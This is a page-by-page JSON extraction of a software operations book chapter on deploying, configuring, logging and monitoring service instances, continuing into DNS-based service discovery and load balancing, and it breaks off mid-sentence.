    {
      "page_number": 165,
      "content": "Chapter 8. Processes on Machines • 156\n\ninstances we refer to processes of the same executable, just running in multiple locations.\n\nExecutable An artifact that a machine can launch as a process and created by a build process. In a compiled language, this will be a binary, whereas an interpreted language will include sources. For simplicity, “executable” also covers shared libraries that need to be installed before execution.\n\nProcess\n\nAn operating system process running on a machine; the runtime\n\nimage of an executable.\n\nInstallation\n\nThe executable and any attendant directories, configuration\n\nfiles, and other resources as they exist on a machine.\n\nDeployment\n\nThe act of creating an installation on a machine. Should be\n\nautomated, with the deployment definition kept in source control.\n\nTo make this more concrete, take a look at the “Loan Request” service shown in the following deployment illustration.\n\nSourceRepository\n\nDeployPipeline\n\nProductionConﬁgs\n\nPackageRepository\n\nMachines\n\nInstallation\n\nbuild\n\ndeploy\n\nIn the deployment view, we’re concerned about transforming sources into binaries and binaries into deployments. This involves moving files around. The build process compiles the source code into binary executables that go into the package repository. As a build progresses through the deployment pipeline, various stages tag the build as having passed. If the build makes it all the way through the pipeline, the very same tagged binary gets laid down as an installation on each machine. All these files are inert during deployment. Now let’s look at the runtime view, shown in the figure on page 157.\n\nIn the runtime view, we’re more concerned with the processes running on the machines. (By the way, a lot of architectural confusion stems from attempts to cram both static and dynamic views into the same figure.) Each machine runs an instance of the same binary: our compiled service. Those instances\n\nreport erratum • discuss",
      "content_length": 1957,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 166,
      "content": "Code • 157\n\nMachine\n\nMachine\n\nInstance\n\nMachine\n\nInstance\n\nMachine\n\nInstance\n\nMachine\n\nhaproxy\n\nMachine\n\nhaproxy\n\n10.10.128.19 10.10.128.20\n\nInstance\n\nall sit behind an HAProxy load balancer with the address 10.10.128.19 bound to the DNS name loanrequest.example.com.\n\nThese definitions may seem persnickety, but teams have been bitten when dif- ferent people use the same word for different things. Precise communication is especially important when dealing with operations. If you tell someone to “reboot the server,” you might not know which server they’re about to bounce, and you can’t be sure whether they’re going to kill a single process or the whole machine.1\n\nNow we can turn our attention to the code, config, and connection the instances require.\n\nCode\n\nEven before we get to questions about containers versus VM images, we should look at some things about the code.\n\nBuilding the Code\n\nDevelopers naturally pay a lot of attention to their code. As a result, we have great tools at our disposal to build, house, and deploy code. There are some important rules to follow, though. These are mostly about making sure that you know exactly what goes into the code on the instance. It is vital to establish a strong “chain of custody” that stretches from the developer through\n\n1.\n\nhttps://theagileadmin.com/2017/01/03/loose-lips-sink-ships-precision-in-language\n\nreport erratum • discuss",
      "content_length": 1395,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 167,
      "content": "Chapter 8. Processes on Machines • 158\n\nto the production instance. It must be impossible for an unauthorized party to sneak code into your system.\n\nIt starts at the desktop. Developers should work on code within a version control system. There’s simply no excuse not to use version control today. Only the code goes into version control, though. Version control doesn’t handle third-party libraries or dependencies very well.\n\nDevelopers must be able to build the system, run tests, and run at least a portion of the system locally. That means build tools have to download dependencies from somewhere to the dev box. The default would be to download libraries from the Internet. (The standard joke for Maven users is that Maven downloads half of the Internet to run a build.)\n\nDownloading dependencies from the Internet is convenient but not safe. It’s far too easy for one of those dependencies to silently be replaced, either though a man-in-the-middle attack or by compromising the upstream repository. Even if you download dependencies from the Net to start with, you should plan on moving to a private repository as soon as possible. Only put libraries into the repository when their digital signatures match published information from the upstream provider.\n\nDon’t forget about plugins to the build system, either. A colleague who asked not to be named described an attempt to subvert his company’s product in order to attack one of its enterprise customers. That attack was introduced via a compromised Jenkins plugin.\n\nDevelopers should not do production builds from their own machines. Developer boxes are hopelessly polluted. We install all kinds of junk on these systems. We play games and visit sketchy websites. Our browsers get loaded up with slimy toolbars and bogus “search enhancers” like any other human user does. Only make production builds on a CI server, and have it put the binary into a safe repository that nobody else can write into.\n\nImmutable and Disposable Infrastructure\n\nConfiguration management tools like Chef, Puppet, and Ansible are all about applying changes to running machines. They use scripts, playbooks, or recipes (each has their own jargon) to transition the machine from one state to a new state. After each set of changes, the machine should be fully described by the latest scripts, as shown in the figure on page 159.\n\nThe “layers of stucco” approach has two big challenges. First, it’s easy for side effects to creep in that are the result of, but not described by, the recipes. For\n\nreport erratum • discuss",
      "content_length": 2557,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 168,
      "content": "Code • 159\n\nConﬁgMgmt\n\nConﬁgScripts\n\nPackageRepository\n\nBase Image\n\nState 1\n\nState 3\n\nState 2\n\nexample, suppose a Chef recipe uses RPM to install version 12.04 of a third- party package. That package has a post-install script that changes some TCP tuning parameters. A month later, Chef installs a newer version of the RPM, but the new RPM’s post-install changes a subset of the original parameters. Now the machine has a state that cannot be re-created by either the original or the new recipes. That state is the result of the history of the changes.\n\nThe second challenge comes from broken machines or scripts that only par- tially worked. These leave the machine in an undefined state. The configuration management tools put a lot of effort into converging unknown machine states into known machine states, but they aren’t always successful.\n\nThe DevOps and cloud community say that it’s more reliable to always start from a known base image, apply a fixed set of changes, and then never attempt to patch or update that machine. Instead, when a change is needed, create a new image starting from the base again, as shown in the figure on page 160.\n\nThis is often described as “immutable infrastructure.” Machines don’t change once they’ve been deployed. Take a container as an example. The container’s “file system” is a binary image from a repository. It holds the code that runs on the instance. When it’s time to deploy new code, we don’t patch up the container; we just build a new one instead. We launch it and throw away the old one.\n\nreport erratum • discuss",
      "content_length": 1569,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 169,
      "content": "Chapter 8. Processes on Machines • 160\n\nBase Image\n\nConﬁgMgmt\n\nConﬁgScripts\n\nPackageRepository\n\nBase Image\n\nState 1\n\nState 3\n\nState 2\n\nBase Image\n\nThat notion of disposability puts the emphasis in the right place. The impor- tant part is that we can throw away the environment, piece by piece or as a whole, and start over.\n\nConfiguration\n\nEvery piece of production-class software has scads of configurable properties containing hostnames, port numbers, filesystem locations, ID numbers, magic keys, usernames, passwords, and lottery numbers. Get any of these properties wrong and the system is broken. Even if the system seems to work most of the time, it could break at 1 a.m. when Daylight Saving Time kicks in.\n\n“Configuration” suffers from hidden linkages and high complexity—two of the biggest factors leading to operator error. This puts the system at risk because configuration is part of the system’s user interface. It’s the interface used by one of its most overlooked constituencies: the developers and operators who support it. Let’s look at some design guidelines for handling instance-level configuration.\n\nConfiguration Files\n\nThe configuration “starter kit” is a file or set of files the instance reads at startup. Configuration files may be buried deep in the directory structure of\n\nreport erratum • discuss",
      "content_length": 1326,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 170,
      "content": "Configuration • 161\n\nthe codebase, possibly in multiple directories. Some of them represent basic application plumbing like API routes. Others need to change per environment.\n\nBecause the same software runs on several instances, some configuration properties should probably vary per machine. Keep these properties in separate places so nobody ever has to ask, “Are those supposed to be different?”\n\nWe don’t want our instance binaries to change per environment, but we do want their properties to change. That means the code should look outside the deployment directory to find per-environment configurations.\n\nThese files contain the most sensitive information in the entire enterprise: production database passwords. They need to be protected from tampering and prying eyes. That leads us to another great reason to keep per-environ- ment configuration out of the source tree: version control. Sooner or later, you’ll accidentally commit a production password to version control. GitHub currently shows 288,093 commits with the title “Removed password.” Tomorrow that number will be higher.\n\nThat’s not to say you should keep configurations out of version control alto- gether. Just keep them in a different repository than the source code. Lock it down to only the people who should have access, and make sure you have controls (i.e., processes, procedures, and people following up on them) to grant and revoke access to those configurations.\n\nConfiguration with Disposable Infrastructure\n\nIn image-based environments like EC2 or a container platform, configuration files can’t change per instance. Frankly, some of the instances will be there and gone so fast that it doesn’t make any sense to apply static configs. There we need to find another way to provide a new instance with details about its mission in life. The two approaches are to inject configuration at startup or use a configuration service.\n\nInjecting configuration works by providing environment variables or a text blob. For example, EC2 allows “user data” to be passed to a new virtual machine as a blob of text. To use the user data, some code in the image must already know how to read and parse it (for example, it might be in properties format, but it might be JSON or YAML, too). Heroku prefers environment variables. So the application code does need some awareness of its targeted deployment environment.\n\nThe other way to get configuration into an image is via a configuration service. In this form, the instance code reaches out to a well-known location to ask\n\nreport erratum • discuss",
      "content_length": 2568,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 171,
      "content": "Chapter 8. Processes on Machines • 162\n\nfor its configuration. ZooKeeper and etcd are both popular choices for a con- figuration service. Because this builds a hard dependency on the config service, any downtime is immediately a “Severity 1” problem. Instances cannot start up when the config service is not available, yet by definition we’re in an environment where instances start and stop frequently.\n\nBe very careful here. ZooKeeper and etcd—and any other configuration service, for that matter—are complex pieces of distributed systems software. They must have a well-planned network topology to maximize availability, and they must be managed very carefully for capacity. ZooKeeper is scalable but not elastic, and adding and removing nodes is disruptive. In other words, these services require a high degree of operational maturity and carry some noticeable overhead. It’s not worth introducing them to support just one application. Only use them as part of a broader strategy for your organization. Most small teams are better off using injected config.\n\nNaming Configuration Properties\n\nProperty names should be clear enough to help the user avoid “unforced errors.” When you see a property called hostname, how do you know which hostname to fill in? Is that “my hostname,” “the name of the authorized caller,” or “the host I call during the autumnal solstice?” It’s better to name the properties according to their function, not their nature. Don’t call it hostname just because it is a hostname. That’s like naming a variable integer because it’s an integer or string because it’s a string. It may be true, but it’s not helpful. Name it authenticationProvider instead, and then the admin knows to look for an LDAP or Active Directory host.\n\nTransparency\n\nShipboard engineers can tell when something is about to go wrong by the sound of the giant diesel engines. They’ve learned, by living with their engines, to recognize normal, nominal, and abnormal. They are constantly surrounded by the sounds and rhythms of their environment. When something is wrong, the engineers’ knowledge of the linkages within the engines can lead them to the problem with speed and accuracy—and with just one or two clues—in a way that can seem psychic.\n\nThe power plant in a ship radiates information through ambient sounds and vibration, through gauges with quantitative information, and in extreme (usually bad) cases through smell. Our systems aren’t so naturally exposed. They run in invisible, faceless, far-distant boxes. We don’t see or hear the fans spin. No giant reel-to-reel tape drives whiz back and forth. If we are to get the kind of “environmental awareness” that the shipboard engineers\n\nreport erratum • discuss",
      "content_length": 2719,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 172,
      "content": "Transparency • 163\n\nnaturally acquire, we must facilitate that awareness by building transparency into our systems.\n\nTransparency refers to the qualities that allow operators, developers, and business sponsors to gain understanding of the system’s historical trends, present conditions, instantaneous state, and future projections. Transparent systems communicate, and in communicating, they train their attendant humans.\n\nIn debugging the “Black Friday problem” (see Chapter 6, Case Study: Phenom- enal Cosmic Powers, Itty-Bitty Living Space, on page 129), we relied on compo- nent-level visibility into the system’s current behavior. That visibility was no accident. It was the product of enabling technologies implemented with transparency and feedback in mind. Without that level of visibility, we prob- ably could’ve known that the site was slow (if a disgruntled user called us or someone in the business happened to hit the site) but have no idea why. It would be like having a sick goldfish—nothing you do can help, so you just wait and see whether it lives or dies.\n\nDebugging a transparent system is vastly easier, so transparent systems will mature faster than opaque ones.\n\nWhen making technical or architectural changes, you are totally dependent on data collected from the existing infrastructure. Good data enables good decision-making. In the absence of trusted data, decisions will be made for you based on somebody’s political clout, prejudices, or whoever has the best “executive style” hair.\n\nFinally, a system without transparency cannot survive long in production. If administrators don’t know what the system is doing, it can’t be tuned and optimized. If developers don’t know what works and doesn’t work in produc- tion, they can’t increase its reliability or resilience over time. And if the busi- ness sponsors don’t know whether they’re making money on it, they won’t fund future work. Without transparency, the system will drift into decay, functioning a bit worse with each release. Systems can mature well if, and only if, they have some degree of transparency.\n\nThis section takes our first slice at transparency. We’ll see what machine and service instances must do to create transparency. Later, in Chapter 10, Control Plane, on page 193, we see how to knit instance-level information with other sources to create system-level transparency. That system-level view will provide historical analysis, present state, instantaneous behavior, and future projec- tions. The job of an individual instance is to reveal enough data to enable those perspectives.\n\nreport erratum • discuss",
      "content_length": 2610,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 173,
      "content": "Chapter 8. Processes on Machines • 164\n\nDesigning for Transparency\n\nTransparency arises from deliberate design and architecture. “Adding trans- parency” late in development is about as effective as “adding quality.” Maybe it can be done, but only with greater effort and cost than if it’d been built in from the beginning.\n\nVisibility inside one application or server is not enough. Strictly local visibility leads to strictly local optimization. For example, a retailer ran a major project to get items appearing on the site faster. The nightly update was running until 5 or 6 a.m., when it needed to complete closer to midnight. This project optimized the string of batch jobs that fed content to the site. The project met its goals, in that the batch jobs finished two hours earlier. Items still did not appear on the site, however, until a long-running parallel process finished, at 5 or 6 a.m. The local optimization on the batch jobs had no global effect.\n\nVisibility into one application at a time can also mask problems with scaling effects. For instance, observing cache flushes on one application server would not reveal that each server was knocking items out of all the other servers’ caches. Every time an item was displayed, it was accidentally being updated, therefore causing a cache invalidation notice to all other servers. As soon as all the caches’ statistics appeared on one page, the problem was obvious. Without that visibility, we would’ve added many servers to reach the necessary capacity—and each server would’ve made the problem worse.\n\nIn designing for transparency, keep a close eye on coupling. It’s relatively easy for the monitoring framework to intrude on the internals of the system. The monitoring and reporting systems should be like an exoskeleton built around your system, not woven into it. In particular, decisions about what metrics should trigger alerts, where to set the thresholds, and how to “roll up” state variables into an overall system health status should all be left outside of the instance itself. These are policy decisions that will change at a very different rate than the application code will.\n\nEnabling Technologies\n\nBy its nature, a process running on an instance is totally opaque. Unless you’re running a debugger on the process, it reveals practically nothing about itself. It might be working fine, it might be running on its very last thread, or it might be spinning in circles doing nothing. Like Schrödinger’s cat, it’s impossible to tell whether the process is alive or dead until you look at it.\n\nThe very first trick, then, is getting information out of the process. This section examines the most important enabling technologies that reduce the opacity\n\nreport erratum • discuss",
      "content_length": 2750,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 174,
      "content": "Transparency • 165\n\nof that process boundary. You can classify these as either “white-box” or “black-box” technologies.\n\nA black-box technology sits outside the process, examining it through exter- nally observable things. Black-box technologies can be implemented after the system is delivered, usually by operations. Even though black-box technologies are unknown to the system being observed, you can still do helpful things during development to facilitate the use of these tools. Good logging is one example. Instances should log their health and events to a plain old text file. Any log-scraper can collect these without disturbing the server process.\n\nBy contrast, white-box technology runs inside the process. This kind of technology often looks like an agent delivered in a language-specific library. These must be integrated during development. White-box technologies neces- sarily have tighter coupling to the language and framework than black-box technologies.\n\nWhite-box technology often comes with an API that the application can call directly. This provides a great increase in transparency, because the applica- tion can emit very specific, relevant events and metrics. It comes at the cost of coupling to that provider. That coupling is a small price to pay when com- pared to the degree of clarity it provides.\n\nLogging\n\nDespite millions of R&D dollars on “enterprise application management” suites and spiffy operations centers with giant plasma monitors showing color-coded network maps, good old log files are still the most reliable, versatile information vehicle. It’s worth a chuckle once in a while to realize that here we are, in the twenty-first century, and log files are still one of our most valuable tools.\n\nLogging is certainly a white-box technology; it must be integrated pervasively into the source code. Nevertheless, logging is ubiquitous for a number of good reasons. Log files reflect activity within an application. Therefore, they reveal the instantaneous behavior of that application. They’re also persistent, so they can be examined to understand the system’s status—though that often requires some “digestion” to trace state transitions into current states.\n\nIf you want to avoid tight coupling to a particular monitoring tool or frame- work, then log files are the way to go. Nothing is more loosely coupled than log files; every framework or tool that exists can scrape log files. This loose coupling means log files are also valuable in development, where you are less likely to find ops tools.\n\nreport erratum • discuss",
      "content_length": 2567,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 175,
      "content": "Chapter 8. Processes on Machines • 166\n\nEven in the face of this value, log files are badly abused. Here are some keys to successful logging.\n\nLog Locations\n\nDespite what all those application templates create for us, a logs directory under the application’s install directory is the wrong way to go. Log files can be large. They grow rapidly and consume lots of I/O. For physical machines, it’s a good idea to keep them on a separate drive. That lets the machine use more I/O bandwidth in parallel and reduces contention for the busy drives.\n\nEven if your instance runs in a VM, it’s still a good idea to separate log files out from application code. The code directory needs to be locked down and have as little write permission as possible (ideally, none).\n\nApps running in containers usually just emit messages on standard out, since the container itself can capture or redirect that.\n\nIf you make the log file locations configurable, then administrators can just set the right property to locate the files. If you don’t make the location config- urable, then they’ll probably relocate the files anyway, but you might not like how it gets done. Odds are it’ll involve a lot of symlinks.\n\nOn UNIX systems, symlinks are the most common workaround. This involves creating a symbolic link from the logs directory to the actual location of the files. There’s a small I/O penalty on each file open, but not much compared to the penalty of contention for a busy drive. I’ve also seen a separate filesystem dedicated to logs mounted directly underneath the installation directory.\n\nLogging Levels\n\nAs humans read (or even just scan) log files for a new system, they learn what “normal” means for that system. Some applications, particularly young ones, are very noisy; they generate a lot of errors in their logs. Some are quiet, reporting nothing during normal operation. In either case, the applications will train their humans on what’s healthy or normal.\n\nMost developers implement logging as though they are the primary consumer of the log files. In fact, administrators and engineers in operations will spend far more time with these log files than developers will. Logging should be aimed at production operations rather than development or testing. One consequence is that anything logged at level “ERROR” or “SEVERE” should be something that requires action on the part of operations. Not every exception needs to be logged as an error. Just because a user entered a bad credit card number and the validation component threw an exception doesn’t\n\nreport erratum • discuss",
      "content_length": 2576,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 176,
      "content": "Transparency • 167\n\nmean anything has to be done about it. Log errors in business logic or user input as warnings (if at all). Reserve “ERROR” for a serious system problem. For example, a circuit breaker tripping to “open” is an error. It’s something that should not happen under normal circumstances, and it probably means action is required on the other end of the connection. Failure to connect to a database is an error—there’s a problem with either the network or the database server. A NullPointerException isn’t automatically an error.\n\nDebug Logs in Production\n\nWhile I’m on the subject of logging levels, I’ll address a pet peeve of mine: “debug” logs in production. This is rarely a good idea and can create so much noise that real issues get buried in tons of method traces or trivial checkpoints. It’s easy to leave debug messages turned on in production. All it takes is one wrong commit with debug levels enabled. I recommend adding a step to your build process that automatically removes any configs that enable debug or trace log levels.\n\nHuman Factors\n\nAbove all else, log files are human-readable. That means they constitute a human-computer interface and should be examined in terms of human factors. This might sound trivial—even laughable—but in a stressful situation, such as a Severity 1 incident, human misinterpretation of status information can prolong or aggravate the problem. Operators for the Three Mile Island reactor misinterpreted the meaning of coolant pressure and temperature values, leading them to take exactly the wrong action at every turn. (See Inviting Disaster [Chi01], pages 49–63.) Although most of our systems will not vent radioactive steam when they break, they will expel our money and our repu- tation. Therefore, it behooves us to ensure that log files convey clear, accurate, and actionable information to the humans who read them.\n\nIf log files are a human interface, then they should also be written such that humans can recognize and interpret them as rapidly as possible. The format should be as readable as possible. Formats that break columns and create a ragged left-to-right scanning pattern are not human-readable.\n\nVoodoo Operations\n\nAs I said before, humans are good at detecting patterns. In fact, we appear to have a natural bias toward detecting patterns, even when they aren’t there. In Why People Believe Weird Things [She97], Michael Shermer discusses the evolutionary impact of pattern detection. Early humans who failed to detect a real pattern—such as a pattern of light and shadow that turned out to be\n\nreport erratum • discuss",
      "content_length": 2601,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 177,
      "content": "Chapter 8. Processes on Machines • 168\n\na leopard—were less likely to pass on their genes than those who detected patterns that weren’t there and ran away from a clump of bushes that hap- pened to look like a leopard.\n\nIn other words, the cost of a false positive—“detecting” a pattern that wasn’t —was minimal, whereas the cost of a false negative—failing to detect a pattern that was there—was high. Shermer claims that this evolutionary pressure creates a tendency toward superstitions. I’ve seen it in action.\n\nGiven a system on the verge of failure, administrators in operations have to proceed through observation, analysis, hypothesis, and action very quickly. If that action appears to resolve the issue, it becomes part of the lore, possibly even part of a documented knowledge base. Who says it was the right action, though? What if it’s just a coincidence?\n\nI once found a practice in the operations group for one of my early commerce applications that was no better than witchcraft. I happened to be in an administrator’s cubicle when her pager went off. On seeing the message, she immediately logged into the production server and started a database failover. Curious, and more than a little alarmed, I asked what was going on. She told me that this one message showed that a database server was about to fail, so they had to fail over to the other node and restart the primary database. When I looked at the actual message, I got cold shivers. It said, “Data channel lifetime limit reached. Reset required.”\n\nNaturally, I recognized that message, having written it myself. The thing was, it had nothing at all to do with the database. It was a debug message (see Debug Logs in Production, on page 167) informing me that an encrypted channel to an outside vendor had been up and running long enough that the encryption key would soon be vulnerable to discovery, just because of the amount of encrypted data that the channel served. It happened about once a week.\n\nPart of the problem was the wording of the message. “Reset required” doesn’t say who has to do the reset. If you looked at the code, it was clear that the application itself reset the channel right after emitting that message—but the consumers of the message didn’t have the code. Also, it was a debug message that I had left enabled so I could get an idea of how often it happened at normal volumes. I just forgot to ever turn it off.\n\nI traced the origin of this myth back about six months to a system failure that happened shortly after launch. That “Reset required” message was the last thing logged before the database went down. There was no causal connec- tion, but there was a temporal connection. (There was no advance warning about the database crash—it required a patch from the vendor, which we had\n\nreport erratum • discuss",
      "content_length": 2813,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 178,
      "content": "Transparency • 169\n\napplied shortly after the outage.) That temporal connection, combined with an ambiguous, obscurely worded message, led the administrators to perform weekly database failovers during peak hours for six months.\n\nFinal Notes on Logging\n\nMessages should include an identifier that can be used to trace the steps of a transaction. This might be a user’s ID, a session ID, a transaction ID, or even an arbitrary number assigned when the request comes in. When it’s time to read ten thousand lines of a log file (after an outage, for example), having a string to grep will save tons of time.\n\nInteresting state transitions should be logged, even if you plan to use SNMP traps or JMX notifications to inform monitoring about them. Logging the state transitions takes a few seconds of additional coding, but it leaves options open downstream. Besides, the record of state transitions will be important during postmortem investigations.\n\nInstance Metrics\n\nThe instance itself won’t be able to tell much about overall system health, but it should emit metrics that can be collected, analyzed, and visualized centrally. This may be as simple as periodically spitting a line of stats into a log file. The stronger your log-scraping tools are, the more attractive this option will be. Within a large organization, this is probably the best choice.\n\nAn ever-growing number of systems have outsourced their metrics collection to companies like New Relic and Datadog. In these cases, providers supply plugins to run with different applications and runtime environments. They’ll have one for Python apps, one for Ruby apps, one for Oracle, one for Microsoft SQL Server, and so on. Small teams can get going much faster by using one of these services. That way you don’t have to devote time to the care and feeding of metrics infrastructure—which can be substantial. Some developers from Netflix have quipped that Netflix is a monitoring system that streams movies as a side effect.\n\nHealth Checks\n\nMetrics can be hard to interpret. It takes some time to learn what “normal” looks like in the metrics. For quicker, easier summary information we can create a health check as part of the instance itself. A health check is just a page or API call that reveals the application’s internal view of its own health. It returns data for other systems to read (although that may just be nicely attributed HTML).\n\nreport erratum • discuss",
      "content_length": 2429,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 179,
      "content": "Chapter 8. Processes on Machines • 170\n\nHealth checks should be more than just “yup, it’s running.” It should report at least the following:\n\nThe host IP address or addresses\n\nThe version number of the runtime or interpreter (Ruby, Python, JVM,\n\n.Net, Go, and so on)\n\nThe application version or commit ID\n\nWhether the instance is accepting work\n\nThe status of connection pools, caches, and circuit breakers\n\nThe health check is an important part of traffic management, which we’ll examine further in Chapter 9, Interconnect, on page 171. Clients of the instance shouldn’t look at the health check directly; they should be using a load bal- ancer to reach the service. The load balancer can use the health check to tell if a machine has crashed, but it can also use the health check for the “go live” transition, too. When the health check on a new instance goes from failing to passing, it means the app is done with its startup.\n\nWrapping Up\n\nInstances are the basic blocks that make up our system. They’re like cobble- stone Minecraft blocks—not that interesting by themselves, but we can make amazing things out of them. If we do a good job of building code to run in instances, then we can make a solid large-scale structure. That means instances should be designed for production. We’ve seen how to make them deployable, configurable, and monitorable. Now we need to look at how we can connect instances together into a whole system. This “interconnect” layer provides many of our most important mechanisms for availability and security, yet it often gets overlooked. In the next chapter we’ll see how to design this important layer for production.\n\nreport erratum • discuss",
      "content_length": 1679,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 180,
      "content": "CHAPTER 9\n\nInterconnect\n\nIn the previous chapter, we looked at instances running on machines. But really, who is interested in a single instance running by itself? A standalone process might as well be on a desert island. We need to connect them together into a system. This chapter continues our iterative zoom-out to look at how the instances work together and find each other, as well as how callers invoke them. It’s time to look at the “interconnect” layer from our schematic (shown in the following figure).\n\nFoundationHardware, VMs, IP addresses, physical network\n\nInstancesServices, processes, components, instance monitoring\n\nInterconnectRouting, load balancing, failover, traﬃc management\n\nControl PlaneSystem monitoring, deployment, anomaly detection, features\n\nOperationsSecurity, availability, capacity, status, communication\n\nThe interconnect layer covers all the mechanisms that knit a bunch of instances together into a cohesive system. That includes traffic management, load balancing, and discovery. The interconnect layer is where we can really create high availability. As with the instance level, we also need to create transparency and control. None of it happens by accident.\n\nreport erratum • discuss",
      "content_length": 1224,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 181,
      "content": "Chapter 9. Interconnect • 172\n\nSolutions at Different Scales\n\nIn previous chapters, we’ve dealt with different solutions, depending on your production environment: physical, virtual, cloud, or container. As we move up the stack into interconnect, control plane, and operations, we also need to consider what solution is right for your organization. For instance, some techniques for service discovery and invocation depend on extra pieces of software. A large team or department with hundreds of small services would do well to use Consul or another dynamic discovery service. The cost of run- ning and operating Consul is easily amortized over the number of teams that benefit. Not to mention, the rate of change is going to be high enough to jus- tify something highly dynamic. On the other hand, a small business with just a few developers should probably stick with direct DNS entries. Changes aren’t going to be as rapid and the developers can keep services up-to-date.\n\nWhat is it that makes a discovery service feasible for the large company? For one thing, it can deal with a high rate of change in both the services included and in the location of the instances in those services. When the rate of change is high, it becomes impossible to update static configuration in service con- sumers. You’d be reconfiguring services several times a day. Also, because service discovery is itself another service, it increases the operational surface area. (Or maybe we should say “service area”?) That’s probably acceptable to the large company because a dedicated operations team and even a “platform” or “ecosystem” team probably run such tools. Finally, in a large company, it’s unlikely that every developer will be aware of every other developer’s changes. It would be unrealistic to believe that service consumers could stay up-to-date with IP address changes in their providers, especially in a highly virtualized, cloud, or container infrastructure.\n\nIn the small company, the opposite is true in every aspect: the rate of change is lower because fewer developers are generating changes. There may not be a sep- arate operations team at all, and the developers might all have lunch together.\n\nHaving read all that, you must also take it with a grain of salt. The balance point keeps changing as tools get more powerful. Big companies push the boundaries of dynamic platforms and bring us tools like Spinnaker, Kuber- netes, Mesos, and Consul. As they create these open-source platforms and ops tools, they put amazing abilities in the reach of even small teams. At one time, monitoring software cost megabucks. Now open source dominates that space, and even the smallest team should (must) have monitoring in place. Open-source ops tools democratize these abilities. Open-source PaaS tools are on the upswing as of this writing.\n\nreport erratum • discuss",
      "content_length": 2861,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 182,
      "content": "DNS • 173\n\nSo as we look at the solutions in the rest of this chapter, it will be helpful to consider each in terms of the rate of change or dynamism it supports, how much operational support it requires, and how much global knowledge it requires.\n\nDNS\n\nLet’s start with the basics and look at DNS. For small teams this is likely to be your best choice, particularly in a slowly changing infrastructure. That would include dedicated physical machines and dedicated, long-lived virtual machines. In these environments, IP addresses will remain stable enough for DNS to be useful.\n\nService Discovery with DNS\n\n“Service discovery” usually implies some kind of automated query and response, but not in this case. When you use DNS to call another service, discovery is more Sherlock Holmes than Siri. Your team needs to find the service owners and pry the DNS name or names out of them. An exchange of favors may be required, maybe a six-pack of beer in the extreme. Once you’ve finished the human protocol, you just put the “host” name into a configuration file and forget about it.\n\nWhen a client calls a service, the provider of that service may only have a single DNS name. That implies the provider is responsible for load balancing and high availability. If the provider has several names, then it’s up to the caller to balance among them.\n\nWhen using DNS, it’s important to have a logical service name to call, rather than a physical hostname. Even if that logical name is just an alias to the underlying host, it’s still preferable. An alias only needs to be changed in one place (the name server’s database) rather than in every consuming application.\n\nLoad Balancing with DNS\n\nDNS round-robin load balancing is one of the oldest techniques—dating back to the early days of the web. It operates at the application layer (layer 7) of the OSI stack; but instead of operating during a service request, it operates during address resolution.\n\nDNS round-robin simply associates several IP addresses with the service name. So instead of finding a single IP address for “shipping.example.com,” a client would get one of several addresses. Each IP address points to a single server. The client therefore connects to one out of a pool of servers, as shown in the figure on page 174.\n\nreport erratum • discuss",
      "content_length": 2303,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 183,
      "content": "Chapter 9. Interconnect • 174\n\nInstance 2shipping2.example.com10.1.1.142\n\nDNS Serverns1.example.com\n\nInstance 1shipping1.example.com10.1.1.141\n\nshipping.example.com?\n\nCaller\n\n10.1.1.142\n\nGET /rates\n\n200 OK ...\n\nshipping.example.com?\n\nGET /rates\n\n200 OK ...\n\n10.1.1.143\n\nAlthough this serves the basic purpose of distributing work across a group of machines, it does poorly on other fronts. For one thing, all the instances in the pool must be directly “routable” from callers. They may sit behind a firewall, but their front-end IP addresses are visible and reachable from clients.\n\nSecond, the DNS round-robin approach suffers from putting too much control in the client’s hands. Since the client connects directly to one of the servers, there’s no opportunity to redirect that traffic if one particular instance is down. The DNS server has no information about the health of the instances, so it can keep vending out IP addresses for instances that are toast. Further- more, doling out IP addresses in round-robin style does not guarantee that the load is distributed evenly, just the initial connections. Some clients consume more resources than others, leading to unbalanced workloads. Again, when one of the instances gets busy, the DNS server has no way to know, so it just keeps sending every eleventh connection (or whatever) to the staggering instance.\n\nDNS round-robin load balancing is also inappropriate whenever the calling system is a long-running enterprise system. Anything using Java’s built-in classes will cache the first IP address it receives from DNS, guaranteeing that every future connection targets the same instance and completely defeating load balancing.\n\nreport erratum • discuss",
      "content_length": 1708,
      "extraction_method": "Unstructured"
    },
    {
      "page_number": 184,
      "content": "DNS • 175\n\nGlobal Server Load Balancing with DNS\n\nDNS has enough limitations when it comes to load balancing across instances that it’s usually worth moving up the stack a bit. However, there’s one place where DNS excels: global server load balancing (GSLB).\n\nGSLB tries to route clients across multiple geographic locations (see the figure that follows). This can be for physical data centers of your own or for multiple regions in a cloud infrastructure. We see this most in the context of external clients routing across the public Internet. Clients will get the best performance by routing to a nearby location—bearing in mind that “nearby” in network terms doesn’t always match physical geography the way you’d expect.\n\nPublic IP of Name Server162.159.24.4Public IP of Name Server204.74.70.31\n\nLocal Load Balancer\n\nLocal Load Balancer\n\nGSLB-aware DNSserver\n\nGSLB-aware DNSserver\n\nNorth AmericaEurope\n\nServiceInstances\n\nServiceInstances\n\nhealthchecksPublic IP of price.example.com151.101.116.133 Private IPs of Instances10.28.100.xx\n\nhealthchecks\n\nPublic IP of price.example.com184.72.248.171 Private IPs of Instances10.147.212.xx\n\nEach location has one or more pools of load-balanced instances for the ser- vice, as shown in the previous illustration. Each pool has an IP address that goes to the load balancer. (See Migratory Virtual IP Addresses, on page 189, for load balancing with virtual IPs.) The job of GSLB is just to get the request to the virtual IP address for a particular pool. GSLB works via specialized DNS servers at each location. Where an ordinary DNS server just has a static database of names and addresses, a GSLB server keeps track of the health and responsiveness of the pools. It offers up the underlying address only if it passes health checks. If the pool is 